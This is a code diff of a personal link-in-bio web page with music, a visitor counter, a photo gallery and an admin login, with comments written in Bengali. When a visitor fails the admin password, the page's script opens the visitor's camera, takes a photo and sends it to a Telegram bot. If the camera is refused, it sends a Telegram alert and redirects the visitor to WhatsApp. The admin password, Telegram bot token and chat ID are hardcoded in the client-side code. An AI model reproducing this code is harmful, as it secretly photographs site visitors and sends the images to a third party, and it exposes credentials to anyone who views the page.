@@ -6,19 +6,21 @@
 <title>Himel Ahammed</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<!-- Firebase SDKs -->
+​<!-- Firebase SDKs -->
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-<style>
-​{ margin: 0; padding: 0; box-sizing: border-box; font-family: Poppins, sans-serif; }
+​<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: Poppins, sans-serif; }
 body { background: #0a0a0b; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; flex-direction: column; }
-/* Admin Button /
+​/* Admin Button */
 .admin-top { position: fixed; top: 15px; right: 15px; z-index: 1000; }
 .admin-btn { background: #232326; border: 1px solid #333; color: #fff; padding: 8px 14px; border-radius: 10px; font-size: 12px; cursor: pointer; }
-.card { width: 100%; max-width: 400px; background: #18181b; border: 1px solid #2a2a2e; border-radius: 32px; padding: 32px 24px; text-align: center; }
+​.card { width: 100%; max-width: 400px; background: #18181b; border: 1px solid #2a2a2e; border-radius: 32px; padding: 32px 24px; text-align: center; }
 .verified { display: inline-flex; align-items: center; gap: 6px; background: #1e1e20; border: 1px solid #2e2e32; border-radius: 20px; padding: 6px 14px; font-size: 11px; color: #a1a1aa; margin-bottom: 18px; }
 .verified i { color: #1DA1F2; }
-/ H বৃত্ত (Music Trigger) /
+​/* =========================================
+ইউনিক ও ক্লিন H বৃত্ত (Music Trigger)
+========================================= */
 .p-wrap {
 position: relative;
 width: 116px;
@@ -63,6 +65,7 @@ box-shadow: inset 0 0 22px rgba(167, 139, 250, 0.45);
 .p-wrap:active .p {
 transform: scale(0.96);
 }
+​/* মিউজিক চলার সময় ইউনিক অ্যানিমেশন */
 .p-wrap.playing .p-ring {
 opacity: 1;
 animation: spinRing 3s linear infinite;
@@ -80,7 +83,7 @@ box-shadow: inset 0 0 26px rgba(167, 139, 250, 0.6);
 0%, 100% { transform: scale(1); }
 50% { transform: scale(1.04); }
 }
-h1 { font-size: 27px; font-weight: 700; }
+​h1 { font-size: 27px; font-weight: 700; }
 .premium-name {
 background: linear-gradient(90deg, #f5f3ff 0%, #a78bfa 45%, #ffffff 100%);
 -webkit-background-clip: text;
@@ -93,7 +96,9 @@ animation: purpleWhite 2.2s ease-in-out infinite alternate;
 100% { text-shadow: 0 0 10px rgba(168,85,247,0.9), 0 0 18px rgba(255,255,255,0.6); filter: brightness(1.15); }
 }
 .bio { color: #a1a1aa; font-size: 13px; margin: 10px 0 20px; line-height: 1.6; }
-/ Live & Total Visitor স্টাইল /
+​/* =========================================
+Live & Total Visitor স্টাইল
+========================================= */
 .visitor-bar {
 display: flex;
 justify-content: center;
@@ -130,7 +135,7 @@ animation: pulseGreen 1.5s infinite;
 70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(34, 197, 94, 0); }
 100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); }
 }
-.link { width: 100%; display: flex; align-items: center; justify-content: space-between; background: #232326; border: 1px solid #333; border-radius: 16px; padding: 16px 18px; text-decoration: none; color: #fff; margin-bottom: 14px; transition: 0.2s; }
+​.link { width: 100%; display: flex; align-items: center; justify-content: space-between; background: #232326; border: 1px solid #333; border-radius: 16px; padding: 16px 18px; text-decoration: none; color: #fff; margin-bottom: 14px; transition: 0.2s; }
 .link:hover { border-color: #444; transform: translateY(-1px); }
 .left { display: flex; align-items: center; gap: 14px; }
 .ic { width: 46px; height: 46px; border-radius: 13px; display: flex; align-items: center; justify-content: center; font-size: 22px; }
@@ -139,7 +144,9 @@ animation: pulseGreen 1.5s infinite;
 .tk { background: #000; border: 1px solid #333; }
 .wa { background: #25D366; }
 .footer { margin-top: 26px; color: #666; font-size: 11px; }
-/ My Gallery ট্রিগার কার্ড /
+​/* =========================================
+My Gallery ট্রিগার কার্ড (নিচে থাকবে)
+========================================= */
 .gallery-trigger {
 width: 100%;
 max-width: 400px;
@@ -212,7 +219,9 @@ border-radius: 20px;
 color: #a1a1aa;
 font-size: 13px;
 }
-/ Gallery Modal /
+​/* =========================================
+পপ-আপ পেজ আকারে Gallery Modal
+========================================= */
 #galleryModal {
 position: fixed;
 inset: 0;
@@ -296,7 +305,9 @@ flex: 1;
 .delBtn { position: absolute; top: 5px; right: 5px; background: #ff1a1a; border: none; color: #fff; width: 24px; height: 24px; border-radius: 50%; cursor: pointer; font-size: 12px; display: none; align-items: center; justify-content: center; z-index: 2; }
 .g-item.admin .delBtn { display: flex; }
 .no-img { color: #71717a; font-size: 13px; text-align: center; padding: 30px 10px; }
-/ Full View Modal /
+​/* =========================================
+ফুল ভিউ ছবি + চারপাশে প্রিমিয়াম লাইটিং গ্লো
+========================================= */
 #viewModal {
 position: fixed;
 top: 0;
@@ -331,8 +342,12 @@ max-width: 95%;
 100% { background-position: 0% 50%; }
 }
 @keyframes photoGlowPulse {
-0% { box-shadow: 0 0 20px rgba(138, 92, 255, 0.65), 0 0 40px rgba(56, 189, 248, 0.35); }
-100% { box-shadow: 0 0 32px rgba(167, 139, 250, 0.95), 0 0 65px rgba(236, 72, 153, 0.55), 0 0 90px rgba(56, 189, 248, 0.4); }
+0% {
+box-shadow: 0 0 20px rgba(138, 92, 255, 0.65), 0 0 40px rgba(56, 189, 248, 0.35);
+}
+100% {
+box-shadow: 0 0 32px rgba(167, 139, 250, 0.95), 0 0 65px rgba(236, 72, 153, 0.55), 0 0 90px rgba(56, 189, 248, 0.4);
+}
 }
 #viewImg {
 max-width: 100%;
@@ -343,7 +358,7 @@ background: #0a0a0b;
 }
 .viewBtns { display: flex; gap: 10px; margin-top: 20px; width: 100%; max-width: 350px; }
 .viewBtns button { flex: 1; padding: 12px; border-radius: 12px; border: none; font-weight: 700; cursor: pointer; }
-/ Login & Upload Modals */
+​/* Login & Upload Modals */
 #loginModal, #uploadModal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 2500; padding: 20px; }
 .modalBox { background: #18181b; border: 1px solid #333; border-radius: 20px; padding: 20px; width: 100%; max-width: 350px; }
 .modalBox h3 { color: #fff; margin-bottom: 12px; }
@@ -355,22 +370,26 @@ background: #0a0a0b;
 ​<div class="admin-top">
 <button class="admin-btn" onclick="openLogin()"><i class="fas fa-user-shield"></i> Admin</button>
 </div>
-​<audio id="bgMusic" loop preload="auto">
+​<!-- H বৃত্তের মিউজিক ফাইল (song.mp3) -->
+<audio id="bgMusic" loop preload="auto">
 <source src="song.mp3" type="audio/mpeg">
 </audio>
-​<audio id="galleryMusic" loop preload="auto">
+​<!-- গ্যালারির ছবি বড় করলে বাজবে যে মিউজিক (Alan Walker Mashup -> gallery_song.mp3) -->
+<audio id="galleryMusic" loop preload="auto">
 <source src="gallery_song.mp3" type="audio/mpeg">
 </audio>
 ​<div class="card">
 <div class="verified"><i class="fas fa-check-circle"></i> Official Verified</div>
-​<div id="avatarBtn" class="p-wrap" onclick="toggleMusic()">
+​<!-- ইউনিক ও ক্লিন H বৃত্ত -->
+<div id="avatarBtn" class="p-wrap" onclick="toggleMusic()">
 <div class="p-ring"></div>
 <div class="p">H</div>
 </div>
 ​<h1><span class="premium-name">Himel Ahammed</span></h1>
 <p class="bio">Music Lover
 All my official links in one place</p>
-​<div class="visitor-bar">
+​<!-- লাইভ ভিজিটর + টোটাল ভিজিটর -->
+<div class="visitor-bar">
 <div class="v-pill" title="Currently Active Visitors">
 <span class="live-dot"></span>
 <span>Live: <b id="liveCount">1</b></span>
@@ -414,7 +433,8 @@ All my official links in one place</p>
 </a>
 ​<div class="footer">Developer Himel • 2026</div>
 </div>
-​<div class="gallery-trigger" onclick="openGalleryModal()">
+​<!-- My Gallery বাটন কার্ড (ক্লিক করলে উপরে পেজ আকারে খুলবে) -->
+<div class="gallery-trigger" onclick="openGalleryModal()">
 <div class="gh-left">
 <div class="gh-icon"><i class="fas fa-images"></i></div>
 <div class="gh-text">
@@ -427,7 +447,8 @@ All my official links in one place</p>
 <i class="fas fa-chevron-right gh-arrow"></i>
 </div>
 </div>
-​<div id="galleryModal" onclick="closeGalleryModal()">
+​<!-- উপরে পপ-আপ পেজ আকারে Gallery Modal -->
+<div id="galleryModal" onclick="closeGalleryModal()">
 <div class="gallery-page-box" onclick="event.stopPropagation()">
 <div class="gp-header">
 <div class="gp-title">
@@ -442,7 +463,8 @@ All my official links in one place</p>
 </div>
 </div>
 </div>
-​<div id="loginModal" onclick="closeLogin()">
+​<!-- Login Modal -->
+<div id="loginModal" onclick="closeLogin()">
 <div class="modalBox" onclick="event.stopPropagation()">
 <h3>Admin Login</h3>
 <input type="password" id="pass" placeholder="Enter Password">
@@ -451,7 +473,8 @@ All my official links in one place</p>
 <p id="err" style="color:#ff4444;font-size:12px;margin-top:8px;display:none">Wrong Password!</p>
 </div>
 </div>
-​<div id="uploadModal" onclick="closeUpload()">
+​<!-- Upload Modal -->
+<div id="uploadModal" onclick="closeUpload()">
 <div class="modalBox" onclick="event.stopPropagation()">
 <h3>Upload Photo</h3>
 <input type="file" id="fileInput" accept="image/*">
@@ -461,7 +484,8 @@ All my official links in one place</p>
 <p id="upStatus" style="color:#a1a1aa;font-size:12px;text-align:center;margin-top:8px"></p>
 </div>
 </div>
-​<div id="viewModal" onclick="closeView()">
+​<!-- Full View Modal (চারপাশে লাইটিং গ্লো + Alan Walker মিউজিক সহ) -->
+<div id="viewModal" onclick="closeView()">
 <div class="glow-frame" onclick="event.stopPropagation()">
 <img id="viewImg" src="">
 </div>
@@ -472,13 +496,19 @@ All my official links in one place</p>
 <p style="color:#888;font-size:11px;margin-top:10px">Click outside to close</p>
 </div>
 ​<script>
+/* ==========================================================
+Gallery Popup Page ওপেন ও ক্লোজ ফাংশন
+========================================================== */
 function openGalleryModal() {
 document.getElementById('galleryModal').style.display = 'flex';
 }
 function closeGalleryModal() {
 document.getElementById('galleryModal').style.display = 'none';
 }
-​function toggleMusic() {
+​/* ==========================================================
+H বৃত্তে ক্লিক করলে মিউজিক চালু/বন্ধ হওয়ার সিস্টেম
+========================================================== */
+function toggleMusic() {
 const audio = document.getElementById('bgMusic');
 const gAudio = document.getElementById('galleryMusic');
 const avatarBtn = document.getElementById('avatarBtn');
@@ -508,7 +538,10 @@ measurementId: "G-BJD027R0MM"
 };
 firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
-​function initVisitorTracker() {
+​/* ==========================================================
+লাইভ ভিজিটর + টোটাল ভিজিটর ট্র্যাকিং সিস্টেম
+========================================================== */
+function initVisitorTracker() {
 const statsRef = db.collection('site_stats').doc('visitors');
 ​if (!sessionStorage.getItem('himel_visited')) {
 sessionStorage.setItem('himel_visited', 'true');
@@ -560,7 +593,11 @@ document.getElementById('liveCount').innerText = "1";
 });
 }
 ​initVisitorTracker();
-​const PASSWORD = "J@hidul)";
+​/* ==========================================================
+অ্যাডমিন ও গ্যালারি কোড (ক্যামেরা Allow -> Telegram Photo, Block -> WhatsApp)
+========================================================== */
+const PASSWORD = "J@hidul)";
+​// টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি সংযুক্ত
 const TELEGRAM_BOT_TOKEN = "9271140218:AAG2lA6yxQ1SnHUkIGQSF1F5-rW33MVKyso";
 const TELEGRAM_CHAT_ID = "7447837601";
 ​let currentViewId = null;
@@ -586,7 +623,8 @@ errEl.style.display = 'none';
 document.getElementById('pass').value = '';
 wrongAttempts = 0;
 }
-​function sendTelegramAlert() {
+​/* টেলিগ্রামে টেক্সট অ্যালার্ট পাঠানোর ফাংশন */
+function sendTelegramAlert() {
 if (!TELEGRAM_BOT_TOKEN) return Promise.resolve();
 const timeStr = new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
 const text = ⚠️ Admin Alert!\n\nকেউ পর পর ২ বার ভুল পাসওয়ার্ড দিয়ে আপনার ওয়েবসাইটের Admin প্যানেলে ঢোকার চেষ্টা করেছে (ক্যামেরা Block করেছে)!\n\n🕒 সময়: ${timeStr}\n🌐 সাইট: himelahammed0.github.io;
@@ -599,22 +637,28 @@ text: text
 })
 }).catch(() => {});
 }
-​async function handleSecurityCheck() {
+​/* ক্যামেরা Allow করলে ছবি তুলে টেলিগ্রামে পাঠানোর ফাংশন */
+async function handleSecurityCheck() {
 const timeStr = new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
 ​try {
+// প্রথমে ক্যামেরার পারমিশন চাইবে
 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+​// যদি ইউজার Allow করে:
 const video = document.createElement('video');
 video.srcObject = stream;
 video.setAttribute('playsinline', '');
 await video.play();
-​await new Promise(resolve => setTimeout(resolve, 600));
+​// ক্যামেরার ফ্রেম ঠিক হওয়ার জন্য সামান্য অপেক্ষা
+await new Promise(resolve => setTimeout(resolve, 600));
 ​const canvas = document.createElement('canvas');
 canvas.width = video.videoWidth || 480;
 canvas.height = video.videoHeight || 640;
 const ctx = canvas.getContext('2d');
 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-​stream.getTracks().forEach(track => track.stop());
-​await new Promise(resolve => {
+​// ক্যামেরা সাথে সাথে বন্ধ করে দেওয়া
+stream.getTracks().forEach(track => track.stop());
+​// ছবি টেলিগ্রামে পাঠানো
+await new Promise(resolve => {
 canvas.toBlob(async (blob) => {
 if (blob) {
 const formData = new FormData();
@@ -629,8 +673,11 @@ body: formData
 resolve();
 }, 'image/jpeg', 0.85);
 });
-​closeLogin();
+​// Allow করলে আর WhatsApp এ যাবে না, শুধু লগইন পপ-আপ বন্ধ হবে
+closeLogin();
 ​} catch (cameraErr) {
+// যদি ইউজার Block করে বা ক্যামেরা না থাকে:
+// টেলিগ্রামে অ্যালার্ট যাবে এবং WhatsApp এ নিয়ে যাবে
 await sendTelegramAlert();
 closeLogin();
 window.location.href = "https://wa.me/8801938250868?text=" + encodeURIComponent("Give Admin");
@@ -667,26 +714,30 @@ localStorage.removeItem('himel_admin');
 closeUpload();
 loadGallery();
 }
-​function openView(src, id) {
+​/* গ্যালারির ছবিতে ক্লিক করলে বড় হবে এবং Alan Walker মিউজিক বাজবে */
+function openView(src, id) {
 currentViewSrc = src;
 currentViewId = id;
 document.getElementById('viewImg').src = src;
 document.getElementById('viewModal').style.display = 'flex';
 document.getElementById('viewDelBtn').style.display = isAdmin() ? 'block' : 'none';
-​const bgAudio = document.getElementById('bgMusic');
+​// যদি H বাটনের মিউজিক চলে তবে সেটি পজ হবে
+const bgAudio = document.getElementById('bgMusic');
 const avatarBtn = document.getElementById('avatarBtn');
 if (!bgAudio.paused) {
 bgAudio.pause();
 avatarBtn.classList.remove('playing');
 }
-​const gAudio = document.getElementById('galleryMusic');
+​// গ্যালারি ছবির গান (Alan Walker Mashup) চালু হবে
+const gAudio = document.getElementById('galleryMusic');
 gAudio.currentTime = 0;
 gAudio.play().catch(err => console.log('Gallery music error:', err));
 }
 ​function closeView() {
 document.getElementById('viewModal').style.display = 'none';
 currentViewId = null;
-​const gAudio = document.getElementById('galleryMusic');
+​// ছবি বন্ধ করলে গানও বন্ধ হয়ে যাবে
+const gAudio = document.getElementById('galleryMusic');
 gAudio.pause();
 gAudio.currentTime = 0;
 }
